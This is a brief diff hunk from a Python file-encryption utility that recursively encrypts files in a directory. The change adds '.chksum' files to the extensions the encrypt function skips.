@@ -20,7 +20,7 @@ def encrypt(dir, E, N, generate_chksum=True):
                     dir+='/'
                 encrypt(dir+f, E, N, generate_chksum)
         elif(os.path.isfile(dir)):
-            if os.path.splitext(dir)[1]==".py" or os.path.splitext(dir)[1]==".pyc" or os.path.splitext(dir)[1]==".tmp" or os.path.splitext(dir)[1]==".cipher":
+            if os.path.splitext(dir)[1]==".py" or os.path.splitext(dir)[1]==".pyc" or os.path.splitext(dir)[1]==".tmp" or os.path.splitext(dir)[1]==".cipher" or os.path.splitext(dir)[1]==".chksum":
                 return
             elif os.path.splitext(dir)[1]==".reverse":
                 dir=reverse_back(dir)
